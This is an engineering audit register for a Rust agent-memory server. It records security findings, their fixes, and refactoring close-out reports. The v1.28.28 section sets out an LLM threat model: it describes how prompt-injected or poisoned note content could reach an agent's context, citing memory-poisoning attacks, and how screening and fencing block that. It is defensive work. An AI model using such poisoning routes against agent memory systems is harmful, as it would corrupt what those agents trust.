# Audit Register — brain-server

Working log of security/correctness/quality audits, findings, and the research
each finding is grounded in. Each audit ships its gaps closed or carries them
forward with a documented reason. The register is additive — older entries stay
as the historical record, newest at the bottom.

---

## 2026-08-02 — v1.11.0 "Associate" pre-release audit (G1–G8)

Source: a post-v1.10.0 audit of the write-path AuthZ surface + dependency
comments + config hygiene, performed before the v1.11.0 HippoRAG release.
Research map at the bottom of this entry.

### Findings + dispositions

| # | Finding | Severity | Disposition |
|---|---|---|---|
| G1 | `authorize()` was never called in production code (v1.2.0 wired the AuthZ surface but no handler invoked it) | High | **Closed this session** — wired into every write-path handler (see below) |
| G2 | `Principal::is_superuser()` treated empty scopes as superuser; an authenticated token with zero grants silently got everything | Medium | **Closed this session** — empty scopes = deny-all; explicit superuser requires `admin:*/*` |
| G3 | (see sweep) — carried | — | Carried to v2.0 (sweep table archived in the private `brain-steward-ip` repo; the plan file was never git-tracked here and moved to that archive on 2026-10-04) |
| G4 | CORS no-wildcard-escape verification | Low | **Verified + hardened** — origins are exact-matched; `*` now stripped at the config choke point |
| G5 | Three stale dependency comments in `Cargo.toml` (rusqlite "Absolute Latest" claim, uuid "UUIDv7" claim, sqlite-vec) | Low | **Closed this session** — comments corrected, NO version bump (deliberate pin documented) |
| G6/G7 | (see sweep) — carried | — | Carried to v2.0 |
| G8 | model2vec single-source risk (boot-time HF fetch is the sole embedding source) | Low | **Closed this session** — `ponytail:` ceiling comment names the upgrade path |

### G1 wiring detail (the "all write routes" pass)

The v1.2.0 AuthZ gate existed but had zero production callers. Every handler
that mutates state or returns chunk content now calls
`handlers::authorize(&principal.0, Action::X, "", domain)?` at entry.
`principal` is `OptPrincipal` (an `Option<Principal>`); `None` = the v1.1
opaque-token / no-JWT back-compat path (superuser), so no existing install
changes behavior. Enforcement binds only when a scoped JWT principal is present.

| Route | Handler | Action | Domain scope |
|---|---|---|---|
| `POST /ingest` | `handlers::ingest::ingest` | Write | request `domain` or `global` |
| `DELETE /memory/{id}` | `handlers::forget::forget` | Write | `global` |
| `POST /sources/reconcile` | `handlers::sources::reconcile` | Write | `global` |
| `DELETE /sources/{id}` | `handlers::sources::delete_source` | Write | `global` |
| `POST /consolidate/apply` | `handlers::consolidate::apply` | Write | `global` |
| `POST /consolidate/undo` | `handlers::consolidate::undo` | Write | `global` |
| `POST /procedure` | `handlers::procedure::create` | Write | request `domain` or `global` |
| `POST /classify` | `handlers::procedure::classify` | Read | `global` (stateless pure fn, uniform gating) |
| `POST /decision/{id}/evaluate` | `handlers::procedure::evaluate` | Read | `global` |
| `POST /suggest` | `handlers::suggest::suggest` | Read | request `domain` or `global` (returns chunk content — audit S1) |
| `POST /suggest/feedback` | `handlers::suggest::feedback` | Write | `global` |
| `POST /domains` | `handlers::domains::create_domain` | Write | the new domain |
| `DELETE /domains/{name}` | `handlers::domains::delete_domain` | Admin | the domain |
| `POST /domains/{name}/vacuum` | `handlers::domains::vacuum_domain` | Admin | the domain |
| `GET /domains/{name}/export` | `handlers::domains::export_domain` | Read | the domain |
| `POST /domains/{name}/import` | `handlers::domains::import_domain` | Admin | the domain |
| `POST /add` (legacy) | `add_chunk` | Write | `global` (legacy error shape, not HTTP 403) |
| `POST /ingest/memory` (legacy) | `ingest_memory` | Write | `global` (legacy error shape) |
| `POST /ingest/markdown` | `ingest_markdown` | Write | `global` (HTTP 403 via new `AppError::Forbidden`) |
| `POST /reindex` (legacy) | `reindex` | Write | `global` (legacy error shape) |
| `POST /quarantine/{id}/release` | `release_quarantine` | Admin | `global` (HTTP 403) |
| `POST /quarantine/{id}/delete` | `delete_quarantine` | Admin | `global` (HTTP 403) |

Notes:
- Modern handlers return a real HTTP 403 (`HandlerError::forbidden`). The three
  legacy `/add`-family handlers keep their `{success:false}` shape (HTTP 200
  with error body) to stay shape-compatible — same choice the capacity guard
  already makes — documented inline at each call site.
- `ingest_markdown` + quarantine routes return a real 403 via the new
  `AppError::Forbidden(String)` variant added to `src/main.rs`.
- Read routes that return content (`/suggest`, `/classify`, `/evaluate`,
  `/domains/{name}/export`) are gated with `Action::Read` so a read-only
  principal can use them without a write grant.

### G2 decision

Empty-scopes `Some(principal)` is now deny-all, NOT superuser. The `None`
principal (opaque-token/no-JWT back-compat) stays superuser in
`handlers::authorize`. Explicit superuser is the `*:*/*` scope (`admin:*/*`).
Updated `empty_scopes_principal_is_deny_all_not_superuser` pins both arms.

### G4 verification

The CORS layer (`build_app` in `src/main.rs`) exact-matches origin strings via
`AllowOrigin::predicate` — no wildcard is ever honored by the layer. The only
escape was a config foot-gun: `CORS_ORIGINS=*` silently matched nothing (a
deployer would think it was open when it was closed). `config::cors_origins()`
now strips the literal `*` at the single choke point; `sanitize_origins` is a
pure fn pinned by two tests.

### G5 correction

Three `Cargo.toml` comments corrected (no version bump — a rusqlite bump is a
behavior-affecting change, out of scope for a comment-cleanup release):
1. `# Database Stack - Verified Absolute Latest` → documents the deliberate
   pin at rusqlite 0.38.0 (locked) and sqlite-vec 0.1.6 (resolves 0.1.9).
2. `uuid` comment claimed UUIDv7 `jti` minting; the code uses
   `Uuid::new_v4()` — corrected.
3. sqlite-vec pinned-version note corrected to match the lockfile.

### G8 ponytail

`StaticModel::from_pretrained` at boot is the single source of truth for every
embedding. A transient HF outage and a model-repo takeover present the same
failure mode. `ponytail:` comment at the load site names the upgrade path:
vendor the weights at install time and load from a local path (air-gapped
Jetson already ships them separately).

### Research map

| Topic | Source | Date | What it grounded |
|---|---|---|---|
| Graphiti / Zep bi-temporal edges + `resolve_edge_contradictions` | context7 `/getzep/graphiti` | 2026-08-01 | v1.6 supersession semantics (valid-time vs wall-clock) |
| MemConflict / MOSAIC | roadmap §v1.6 | 2026-08-01 | manual-first conflict resolution (no auto-delete) |
| HippoRAG 2 PPR-over-KG | 2026-08 research (HippoRAG/PRP/IPR literature) | 2026-08-02 | v1.11.0 "Associate" third RRF leg |
| ColBERT / ColPali | 2026-08 survey | 2026-08-02 | recorded as future option, NOT scoped (model-load cost) |
| Matryoshka embeddings | 2026-08 survey | 2026-08-02 | recorded as future option (truncation trade-off) |
| Mem0 corpus + feedback analytics | context7 `/mem0ai/mem0` | 2026-08-02 | v1.9 suggest feedback metric shape |
| Letta / MemGPT anticipatory memory | context7 `/letta-ai/letta` | 2026-08-02 | v1.9 suggest is reviewable pull, never push |
| OWASP API Security Top 10 2026 | OWASP | 2026-08-02 | AuthZ wiring priority (G1), deny-by-default (G2) |

Carried-forward gaps (G3/G6/G7 and the v1.9.1 carry-forwards) are tracked in
`IMPLEMENTATION_ROADMAP_v1.5_to_v4.0_EVIDENCE_GATED.md` and the v2.0.0 Cortex
milestone in `ROADMAP.md`.

---

## Register — 2026-08-23 independent security audit (v1.28.8 line)

Single open-items register for the later audit series (the ATLAS F- / S2- /
S3- / adversarial / MEMORY_STACK_REPORT entries are folded into CHANGELOG.md
per release; this table is the live closure view). Findings F-*: audit
`BRAIN_SECURITY_AUDIT_2026-08-23.md`; remediation per the 1.28.9–1.28.14
operator prompt.

| Finding | Theme | Status | Closure |
|---|---|---|---|
| F-I1 write gate not exclusive | Seatbelt (1.28.10) | closed | `BRAIN_WRITE_POSTURE=review` routes six agent writes through the proposal pipeline (`review_posture_routes_writes_to_proposals`) |
| F-R4 digest-less approve | Gateweld (1.28.9) | closed | `400 digest_required` (`review_digest_matches_gates_stale_approval`) |
| F-L5 mount attestation spoofable | Gateweld (1.28.9) | closed | server-verified vs boot manifest, 409 pre-write (`plugin_mount_evidence_is_audited_and_input_gated`) |
| F-M3 Rust fence welding forge | Boundary (1.28.11) | closed | `fence::wrap_fenced`, control chars before sentinel strip (`wrap_fenced_blocks_control_char_welding`, mcp + CLI pins) |
| F-I2 taint dropped at boundary | Boundary (1.28.11) | closed | recall hits serialize origin/flagged/authority; UMP records `untrusted:true`; export labeled verbatim (`recall_hit_serializes_provenance_taint_labels`) |
| F-L1–L3 LITL decision UI | Anchor (1.28.12) | closed | dock full-content scroll box, overview link-only, actions above content (`dock_renders_full_content_not_a_clamp`, `overview_queue_is_link_only_no_inline_decide`) |
| F-B1–B3 hollow boot chain | Anchor (1.28.12) | closed | symlink containment, Ed25519-signed manifest + `/app/boot.pub`, embedded fetch-and-refuse loader, digest-stamped SW, external SW registration (`symlink_escaping_dist_is_refused`, client/tests/boot.test.mjs) |
| F-S1 unpinned CI refs | Bedrock (1.28.13) | closed | all `uses:` SHA-pinned with version comments; least-privilege permissions |
| F-S2 rerank CWD-relative model dir | Bedrock (1.28.13) | closed | absolute-or-env only (`resolve_model_dir`); `scripts/gen-model-manifest.sh` + installer provisioning |
| F-W2 UMP key dir warn-only | Bedrock (1.28.13) | closed | fail-closed at startup |
| F-B4 headers missing on 401/429 | Bedrock (1.28.13) | closed | headers layer outermost (`security_headers_present_on_401_and_429`) |
| F-B4 context drawer unstripped | Bedrock (1.28.13) | closed | strip_invisible on drawer content |
| F-I3 residual unicode screen evasion | Bedrock (1.28.13) | closed (bounded) | added U+180E/115F/1160/FFF9–FFFB; matching-time fullwidth fold — general NFKC/homoglyph folding stays a documented ceiling (zero-dep rule) |
| F-D1/D2/D3 doc drift | Bedrock (1.28.13) | down payment | THREAT_MODEL ↔ OWASP_AGENTIC cross-link; this register is the single findings view; full truth pass tracked separately |
| F-W1 shared static token | partial | mitigated | installer provisions a second agent token under review posture; full workload identity stays v3.7 |
| F-E1/E2 openclaw UI egress, F-M2 host fingerprint, F-M4 requiresToolAuthority | closed via Shutter (1.28.68) for F-E1/E2; F-M2 host fingerprint closed via Pin (1.28.67, MCP catalog pins); F-M4 requiresToolAuthority closed via Truthglass (1.28.66, approval args + authority surface) | closed | see the 2026-09-06 joint register below — the deferred-upstream row is retired |

---

## Register — 2026-09-06 joint security audit (brain-server v1.28.62 × openclaw fork)

Single live register for the joint audit (`BRAIN_OPENCLAW_SECURITY_AUDIT_2026-09-06.md`,
operator-held copy; fresh namespace `X-`, 41 findings). Dispositions below are the
shipped-closure view at HEAD (v1.28.68): SEAM LINE rows closed per their release
CHANGELOG § + release gates; the v1.28.68 row re-verified in this session against the
audit's cited source sites in the fork (the three §4.7 findings now carry the fixes at
exactly the named seams) plus the e2e canary proof. Ship order .63 → .68 held.

| Finding | Theme | Status | Closure |
|---|---|---|---|
| X-W1–X-W5 | workflow input seam (outbox forgery, steering laundering, status vocabulary, valet screen, alert-bus kind) | closed (1.28.63 Wardline) | reserved vocabulary at `enqueue_child` + closed statuses + valet fence function-held + `valet/due` kind auth — the only code-false security law made true |
| X-A1, X-A2, X-A3a, X-A6–X-A9 | revocation + surface identity completeness | closed (1.28.64 Blackout) | kill-switch wired into authN; denylist TTL = token exp; per-kid `alg` compare; public-path single source; guard-table reverse scan; per-method authz; `INJECTION_POLICY` fail-closed |
| X-R1, X-R5, X-S1, X-M2 | content hygiene across the model seam | closed (1.28.65 Meridian) | `/suggest` `untrusted:true`; plugin strip-set parity fixture; host merge seam strips + neutralizes; MCP results ride the external-content idiom |
| X-L1, X-L2, X-L3, X-L5 | the approver sees the truth | closed (1.28.66 Truthglass) | approval `args` (effective, redacted, capped) on both transports; truncation keeps head+tail with exact counts; `dsar --action` + blast-radius prompts; restore interlocks + 0600 passphrase files |
| X-M1, X-M3, X-C1, X-C2 | tool & signer identity pinned | closed (1.28.67 Pin) | `BRAIN_MCP_SCOPE` read\|full fail-closed; MCP catalog per-tool/server pins reconciled per run; parcels `expected_signer` REQUIRED + operator pin in verify; unsigned-served census in `/ump/audit/verify` |
| X-E1, X-E2, X-E4 | image & beacon egress (§4.7) | closed (1.28.68 Shutter) | doc-mode remote images default OFF + operator host allowlist, gated at the renderer (the audit's `markdown-render-options.ts:36` now `?? false`); favicon proxy default OFF + allowlist + letter tile, SSRF guard pinned under the ON posture (the audit's `plugin-icon-http.ts` beacon gate now enable-AND-allowlisted); `data:` URIs ≤ 64 KiB decoded (the audit's always-render `INLINE_DATA_IMAGE_RE` path now budget-checked). Fork e2e: zero-fetch canary proof; brain docs half = THREAT_MODEL §5 + SECURITY reporter scope (audit §9's rider) |
| X-E3, X-M4, X-M5, X-M6 | egress & process boundary | closed (1.28.69 Deadbolt) | shared egress client: resolve → validate (IANA IPv4/IPv6 special-purpose tables) → PIN, insert-only, boot-time for the two env sinks + `BRAIN_EGRESS_ALLOW_PRIVATE=1` loud opt-out (private sink refuses the boot); hostcall HTTP keeps its allowlist + gains validate-on-first-use + insert-only per-host client cache; `BRAIN_STEWARD_BIN` absolute-only (PATH scan deleted); crank `kill_on_drop(true)` + `try_wait`-error kill/reap (the router's 30 s TimeoutLayer drop now kills the child too); `console pending` requires the mapped actor's `read` capability |
| X-A4a, X-A5 | opaque-mode operator/agent split + telemetry scoping | closed (1.28.70 Twokeys) | token-file line 2 / `AGENT_TOKEN_FILE` (0600, boot-refused when leaked) resolves to the typed `PrincipalKind::AgentLoopback` principal (`agent@loopback` — the `agent` preset role + `write:*/global`), bound by the EXISTING authz matrix (no Admin/purge/domains/revoke/dsar/DPO/workflow-engine); Blackout's kill-switch revokes it by principal name at the opaque middleware; agent 403s audited at that boundary (`agent_forbidden`); single-token deployments byte-identical (pinned) + the LEGACY SUPERUSER boot warn; `/health/db` full body Admin-on-global (Read gets `{status, version, db_ok}`); `/metrics` per-domain labels collapse to summed `other` for out-of-scope scrapers, global gauges unchanged |
| X-R4, X-R6, X-R7 | the screen sees what the model sees | open → v1.28.71 "Pores" | |
| X-R3, X-W6, X-L4, X-E5 | every emitted surface is shaped | open → v1.28.72 "Scrim" | |
| X-C3, X-C4, X-W8 | key & evidence lifecycle | open → v1.28.73 "Keyring" | |
| X-S2, X-F3 | taint labels survive the whole trip | open → v1.28.74 "Origin" | |
| X-W7, X-A4b, X-C5, X-C6, X-C8 | Loop-line preconditions + posture docs + SBOM | open → v1.28.75 "Preflight" | |
| X-A3b | JWT key store hot reload | register | rotation = PEM drop + restart; alg compare closed at .64 |
| X-A10 | shared loopback rate-limit bucket | register | carried S2-40; matters at first non-loopback deploy |
| X-C7 | `rsa 0.9.10` Marvin Attack | stands | documented `.cargo/audit.toml` ignore; no fixed upstream version |
| X-S3, X-F1, X-F2 | channel framing / Loop line / WASM+payments+OpenRouter | accepted ceilings / forward | threat-model addenda are entry criteria (audit §8) |

---

## 2026-08-25 — v1.28.28 "Channel" third-pass deep hardening audit

Adversarial pass over the case-scoped channel surface (`src/workflow/channel.rs`,
`src/handlers/channel.rs`, the `case/%` SSE drain, and the Channel DSAR arms),
performed before release/tag. Method: OWASP Top-10 for LLM Applications v2025
(LLM01–LLM10) as the review frame + the 2025–26 agent-memory-poisoning
literature (AgentPoison NeurIPS'24; MINJA arXiv:2503.03704; Memory Poisoning
Attack & Defense arXiv:2601.05504; ConfusedPilot arXiv:2408.04870; TMA-NM
non-malleable origin-bound memory authority; SMSR certified defense; MemAudit
post-hoc attribution). Every disposition below is grep- or test-verified on
the shipped tree.

### Input-channel threat model (OWASP LLM01 auditor artifact)

| Channel into the system | Defense (one function each) | Verified by |
|---|---|---|
| Human note content (POST /notes) | `channel::screen_content`: trim-empty → ≤4000 → prompt-injection blocklist → invisible-strip → markdown-ref strip; stored viewer-independent | `notes_are_screened_and_case_scoped_only` |
| Mention tokens (@skill:x / @name) | exact-match resolution against server-side tables only; dead OR over-vocabulary tokens refuse loudly with the list — never skipped, never echoed as resolvable | `mention_resolves_skill_to_principals`, `oversized_mention_tokens_report_dead_not_skipped` |
| Invitee ids at insert | identity validation INSIDE `insert_note` (fence holds of the FUNCTION, not call-site discipline); invalid ids refuse before any row | `insert_note_validates_invitee_identity_before_any_write` |
| Lineage event payloads (engine-facing bus) | structural content-freedom: no emit payload carries note text — ids + actors only, so poisoned prose cannot ride `/events` into any agent context | `note_content_never_rides_lineage_payloads` |
| SSE live drain + Last-Event-ID replay | `sanitize_stored` once at drain + per-subscriber run-domain Read gate, fail-closed; admission default-off behind `?kinds=workflow` | pre-existing Witness pins + `channel_notes_drain_to_the_sse_bus` |
| Channel view reads | read seam on every emitted string + retention hide before page split | handler + `notes_honour_retention_and_dsar_sweep` |

### Findings + dispositions

| # | Finding | OWASP map | Severity | Disposition |
|---|---|---|---|---|
| H1 | No per-run cap on channel rows — an authorized writer could flood a run with notes (each costing note + lineage event + audit rows), unbounded storage growth | LLM10 Unbounded Consumption | Medium | **Closed this pass** — `MAX_NOTES_PER_RUN = 1000` shared budget (notes + invites), refused in-tx before any write with `409 channel_full`; REFUSES rather than steering's drop-oldest because case rooms are evidence (`channel_full_refuses_at_the_ceiling`) |
| H2 | Over-vocabulary mention tokens (>32-char skill tag, >256-char name) were SILENTLY SKIPPED by the parser — the author believes a mention fired when it didn't | LLM01 (detection-control completeness) | Low | **Closed this pass** — over-long tokens flow through and resolve as dead, reported in `details.unresolved` like any dead token (`oversized_mention_tokens_report_dead_not_skipped`) |
| H3 | `insert_note` trusted invitee ids from the caller; a future caller bypassing resolution could store unvalidated identities (invisible-char collision class, the Relay addressee lesson) | LLM01/LFP class | Low | **Closed this pass** — identity validation inside the core fn, refusal precedes all writes (`insert_note_validates_invitee_identity_before_any_write`) |
| H4 | DSAR asymmetry: purge erased subject-authored/addressed notes but the Art-15 EXPORT bundle never disclosed them (and content-bearing notes were never swept) | GDPR Art 15/17 symmetry | Medium | **Closed this pass** — sweep gains the content `LIKE %subject%` arm (proposals-sweep posture); export bundle carries `channel_notes[]` selected by the SAME three arms the purge erases, built pre-sweep in-tx (`dsar_export_bundle_builder_matches_live_shape`, extended erasure pin) |
| H5 | Note content reaching an agent's context would be the AgentPoison/MINJA poison sink | LLM01/LLM04 | Info (structural) | **Verified structurally absent** — notes are workflow-lineage data, NOT knowledge-corpus rows; no retriever indexes them; engines consume steering/intake topics only; lineage payloads carry ids only (H4's pin holds the boundary for Mesh .29) |
| H6 | Mention spoofing via confusable/homograph unicode | IFC/spoofing | Info | **Verified closed by construction** — resolution is byte-exact against server-side tables; display-side invisible strip covers rendering; write-time screen strips invisibles so stored ids cannot smuggle fence markers |
| H7 | SQL interpolation in new surfaces | classic inj. | Info | **Verified clean** — zero `format!`-interpolated SQL in channel/handler/alert paths (grep); every predicate parameterized |
| H8 | Accept-invite does not verify acceptor == addressee | authz | Accepted ceiling | Carried deliberately (Relay delegation posture): tightening strands cross-shift accepts when tokens rotate; Write-on-domain is the trust boundary |
| H9 | Retention is read-time enforcement; no worker deletes expired notes | LLM10/lifecycle | Accepted ceiling | Consistent with the repo's no-background-worker law; physical deletion rides run-level erasure; documented ceiling unchanged |
| H10 | Single-sanitize SSE drain posture (no per-subscriber PII redaction on a shared broadcast) | LLM02 | Accepted ceiling | Mitigated structurally: drained payloads carry NO note content (H4 pin); write-time screen is the guarantee; documented since Witness |

### Research-grounded posture notes
- The literature's consensus defense against memory poisoning is layered:
  write-time screening (shipped: one blocklist function per channel),
  provenance/origin binding (shipped: hash-chained audit per mutation,
  actor+target, tamper-evident chain + head pin), HITL gates for anything
  decision-shaped (steering stays approve-gated; notes carry no engine
  authority), and post-hoc causal attribution (shipped: per-note audit target
  `note:{id}` reconstructs authorship from the chain — the MemAudit goal).
- TMA-NM's non-malleability ideal maps to the existing content_digest law
  (ReviewArmour) + audit head pin; no new machinery warranted this pass.
- SMSR's result ("no provenance-free retrieval-time filter certifies against
  adaptive injection") is why notes are fenced OUT of retrieval entirely
  rather than filtered INTO it.

---

## 2026-08-26 — v1.28.41 "Terrain" — the Conformance Line series close-out

Source: the series-exit gate (G8) of the v1.28.37→.41 Conformance Line — the
full dogfood cycle re-audit of `docs/CONTACT_CENTER_STANDARDS.md` before the
v1.29.x Console inherits.

### Disposition of the line

| Gate | Release | Disposition |
|---|---|---|
| G1 ISO 10002 complaint lifecycle | v1.28.37 Advocate | Closed — register = audit chain, ack sweep + monthly extract ride signed calibration |
| G2 normative metric dictionary | v1.28.38 Lexicon | Closed — docs↔JSON↔schema parity meta-tests |
| G3+G4 WCAG 2.2 AA gate + RTL/pseudolocale | v1.28.39 Access | Closed — six new AA criteria release-blocking; ceilings honest in the ACR |
| G5+G7 WFM seam + workload visibility | v1.28.40 Handshake | Closed — `wfm/1` versioned additive seam; fatigue alerts never reassign |
| G6 COPC R8.0 performance mapping | v1.28.38 Lexicon | Closed — COMPLIANCE.md §6.7 rows → metric dictionary |
| G8 tier guide tested + series exit | v1.28.41 Terrain | Closed this pass — profiles + tier-smoke CI + drift meta-test; matrix every row green or ceiling/watch-marked (`series_exit_gate_checklist_green_or_ceiling_marked`) |
| G9 PCI boundary row | closed pre-Terrain | THREAT_MODEL §6 explicit non-scope row verified present this pass |

### Findings from the exit audit itself

| # | Finding | Severity | Disposition |
|---|---|---|---|
| X1 | Matrix rows for KCS loop, SLA envelopes, RTL (G4), WFM seam (G5), workload (G7) still carried stale 🟡/⚠️ statuses despite shipping in .36–.40 | Doc-drift | **Closed this pass** — matrix re-audited to green-or-ceiling-marked; the new meta-test forbids regression |
| X2 | Tier guide existed as prose only; no checked-in profile could prove a tier boots | Medium | **Closed this pass** — `deploy/tiers/t{1..4}.env` + CI tier-smoke matrix + two meta-tests |
| X3 | ISO/AWI 18295-1 revision pending upstream | Watch item | Ceiling-marked in the matrix (G10); cannot land silently |

**Inheritance test:** nothing in v1.29.x may backfill an Order-of-Care row —
if it must, this line failed and this register says so.

---

## 2026-09-03 — v1.28.52 "Cornerstone" — the Foundation Line close-out report

Source: the line-exit audit of the Foundation Line (v1.28.46 "Plumb" →
v1.28.52 "Cornerstone"). The line's promise: handlers hold ZERO SQL, the
service layer owns storage, and the law is machine-checked — "the repo has
ONE pattern, CI-enforced." This entry records the evidence, per the line's
executor contract.

### AMENDMENT (declared up front)

The Cornerstone executor prompt assumed v1.28.51 shipped an EMPTY allowlist.
It did not: `gate.rs` (the HITL proposal engine, 78 statements = 50 prod + 28
test) was Confluence's declared straggler. Per the prompt's own
"Deviations = STOP + amendment" rule the executor stopped; the operator chose
the AGENTS.md-prescribed path (option A): the final-vein extraction ran
INSIDE v1.28.52 as its opening act, then the flip proceeded exactly as
written. The extraction honored the line discipline — one surface per
commit, full gate per commit, baseline row lowered in the same commit.

### The final vein: gate.rs → `service::gate` (six commits)

| Commit | Surface | Floor |
|---|---|---|
| 1 | review-queue read (`ProposalView`, deadline/SLA, page SELECT pair, owner filter; 3 read pins ride) | 78 → 68 |
| 2 | creation insert (`NewProposal` + pending audit) + conflict pre-check | 68 → 66 |
| 3 | expire/reject (TTL write with wall-clock-as-arg; pending-fence read ONE-DEFINED across approve/reject/edit; reject CAS; content read) | 66 → 59 |
| 4 | edit path (8-col row read + re-score CAS) | 59 → 57 |
| 5 | approve family (pending-row read; decision CAS one-defined across SIX branches; article-state CAS typed so `public_slug_taken` keeps its 409; translation CAS with its verbatim `datetime('now')` quirk pinned+filed; KCS draft insert; vec shadow one-defined across both promote paths; case-article link; supersession link-follow; promote insert; the two promote-provenance pins moved onto the core driving the REAL insert) | 57 → 21 |
| 6 | export read (`export_bundle` = count pre-flight + four datasets; export/migration/pii_map pins ride; comment/identifier residue reworded to zero) | 21 → 0 |

### Scope 1 — the enforcing flip

`SQL_BASELINE` (29 rows), the floor pin, and the substring-absorption
machinery are DELETED — nothing is left to compare against.
`no_sql_in_handlers_enforced` walks `src/handlers/` RECURSIVELY and fails on
ANY counted statement — production, test fixture, or comment residue (the
substring counter is deliberately strict; the false-positive class the old
baseline absorbed now has nowhere to hide, so drained files are reworded
clean). Two anti-vacuity teeth: a ≥30-file sanity on the walk (the lipstyk
lesson — a guard that scans nothing must not smile) and the
`sql_statement_counter_still_fires` self-pin proving the counter still
detects all four statement openers, comment residue included, with a
negative control.

### Scope 2 — the layer grep

`service_layer_free_of_http_types` (renamed from
`service_layer_is_transport_free` at the flip) forbids `axum`, `StatusCode`,
`Json`, `AppState`, `Pool` in production source under `src/service/`. It was
born a hard error at the Plumb pin — there was never a warning phase — so the
prompt's "flip" is declarative: the name now matches the line plan, and both
guards ride CI through the `lint-test` job's `cargo test` steps (default +
bench), alongside the inventory guard.

### Pin + test counts across the line

| Release | Service-tree pins | Suite (bench) |
|---|---|---|
| v1.28.45 (baseline) | 0 (the layer did not exist) | 1268 passed / 7 ignored |
| v1.28.46 Plumb | 9 | — |
| v1.28.47 Quarry | 27 | — |
| v1.28.48 Masonry | 41 | — |
| v1.28.49 Terrace | 58 | — |
| v1.28.50 Aqueduct | 76 | — |
| v1.28.51 Confluence | 80 | 1316 passed / 7 ignored |
| v1.28.52 HEAD | **89** | **1308 passed / 7 ignored** |

HEAD arithmetic: 80 − 2 (baseline + floor deleted) + 2 (enforcing guard +
self-pin) + 9 (gate.rs) = 89. The suite count moved 1268 → 1308 over the
line and 1316 → 1308 across Cornerstone itself: the −8 is the drained
handler-side test region (queue-read, export, and mirror pins moved onto the
core where several were merged into REAL-path pins instead of re-stating
column lists) and the deleted freeze machinery, against the +2 flip pins and
the moved tests. Every milestone's pins still pass at HEAD (full suite green,
0 failed). Count ≥ v1.28.45 baseline: YES (1268 → 1308).

### Eval-floor history (v1.28.50 "Aqueduct")

The line's only retrieval-adjacent release gated EVERY extraction commit on
the frozen 25-doc corpus (fresh scratch instance, CI recipe):
pre-move baseline r@5 0.976 / r@10 0.991 / MRR 0.956; after the recall core
commit identical; after the ingest core commit identical — byte-identical
means AND per-query ranks on all 106 judged queries; floors (0.85) green at
every gate. The honest scope: this proves behavior preservation on the
frozen set, NOT external-engine parity (LongMemEval stays pending).
Confluence and Cornerstone touch no retrieval path and re-ran no eval gate.

### Smoke matrix per phase

| Phase | Live smoke (DB copy, release binary) |
|---|---|
| Plumb | old-vs-new smoke on identical copies (retention family) |
| Quarry | shim-mode copy: owned root + derived surface seeded; held row deferred with reasons |
| Masonry | two servers, one seeded copy, v1.28.46 vs then-current — lifecycle families only |
| Terrace | multi-db copy: client register flows, hold fence |
| Aqueduct | multi-db copy: 3-leg recall, trace replay, include_flagged posture, screened + quarantined ingest, dedup, /audit/verify throughout |
| Confluence | procedure evaluate, UMP ops read (integrity-verified), kcs worklist, forget (tombstone carries digest), suggest + feedback, Art.30 register read, webhook HMAC path (401s), /audit/verify throughout |
| Cornerstone | this release's smoke — see the Gates row below (gate-family flows on a DB copy) |

### Wire + schema identity (the line's core proof)

- **Routes:** the registered route set is BIT-IDENTICAL v1.28.45 → HEAD
  (147 `.route(` registrations, sorted-diff empty).
- **Route-authz gate table:** the `authz_gates_cover_every_non_public_route`
  table is md5-identical across the line (201 rows); the pin bodies of both
  wire guards (`authz_gates_cover_every_non_public_route`,
  `test_openapi_covers_routes`) are md5-identical — the contract tables were
  not touched to make a move pass.
- **openapi.yaml:** ONE line differs from the v1.28.45 baseline —
  `POST /ingest/proposal` `content.maxLength` 2000 → 10000, shipped in
  Confluence commit b8cb52c together with the matching server bound
  (`MAX_PROPOSAL_CONTENT = 10_000` replacing the borrowed `MAX_QUERY = 2000`
  in the propose/edit paths). FINDING: that release's "openapi.yaml
  diff-empty" claim is TRUE for routes and FALSE for this bound; the edit
  honored wire-contract discipline (contract + code in the same commit, the
  openapi-coverage test green) but was not declared in the release notes.
  DISPOSITION: declared here; the bound stays (widening is caller-visible
  but non-breaking, and reverting would break shipped callers); a
  `docs_truth`-style parity pin on the proposal bound is the follow-up.
  Every OTHER line release (46→47→48→49→50 and 51→52) is openapi diff-empty.
- **Schema:** `schema_meta.schema_version` still stamps **1.28.45** —
  untouched across all seven releases (no migration landed in the line; the
  line is storage-RELOCATION, not storage-CHANGE).

### Cornerstone gates (this release)

fmt clean; clippy `--all-targets --features bench -D warnings` green; full
suite 1308 passed / 7 ignored at HEAD (green at every one of the seven
commits); enforcing guard + self-pin + renamed layer pin green; mdbook build
green with the new architecture sections.

### Ceilings (honest)

- The compliance-pack TEST RUN owed from Confluence is STILL owed before
  push (clippy green; the one-time full rebuild is the cost).
- The translation CAS's `decided_at = datetime('now')` (SQL-side clock,
  inconsistent with every other branch's bound parameter) is preserved
  VERBATIM and needs a pin or fix — filed, not changed in the move.
- The maxLength parity pin (above) is a follow-up.
- The line proves pattern singularity, not schema evolution readiness: the
  storage-adapter deadline trigger (pre-v2.x) is the next forcing function.

## 2026-09-05 — v1.28.57 "Capstone" — the Spire Line close-out report

The Spire Line (v1.28.54 "Scaffold" → v1.28.55 "Buttress" → v1.28.56
"Vaulting" → v1.28.57 "Capstone") set out to dismantle the 19,906-line
main.rs without changing a byte of behavior, and to make the end state
IMPOSSIBLE TO UNDO QUIETLY. This report is the line's measured
before/after, re-measured at the tip with `wc`/`grep` — not from memory.

### The before/after table

| Measure (needle, measured the same way every time) | Scaffold open (freeze) | Buttress close | Vaulting close | **Capstone close (this audit)** |
|---|---|---|---|---|
| `wc -l src/main.rs` | 19,906 | 18,291 | 12,471 | **124** |
| test region (lines from `#[cfg(test)] mod tests` to EOF) | 13,342 | 12,302 | 12,294 | **absent** (absence-pinned) |
| route-registration sites in main.rs | 234 | 234 | 35 (test stubs) | **0** (pinned) |
| route-registration sites under src/server/router/** | — (n/a) | — (n/a) | 199 (floor gained) | **199** (floor held) |
| crate `#[test]` needle | 1,178 (src) | 1,185 (src) | 1,185 (src) | **1,198 = 1,076 src + 122 tests** (floor 1,196 over the widened subject) |
| guard-table rows (coverage / authz) | 151 / 141 | 161 / 145 | 161 / 145 | **161 / 145** (floored) |
| schema version | 1.28.45 | 1.28.45 | 1.28.45 | **1.28.45** (untouched across all 13 releases) |
| wire artifacts | diff-empty | diff-empty | diff-empty | **openapi.yaml diff-empty vs v1.28.56**; x-api-version moves with the release stamp |

Per-milestone deltas (net main.rs lines): Scaffold −624, Buttress −1,191,
Vaulting −5,820, Capstone −12,347. Nothing deleted: every test that ever
lived in main.rs lives in the tree today — relocated, never removed.

### What moved where (the module map)

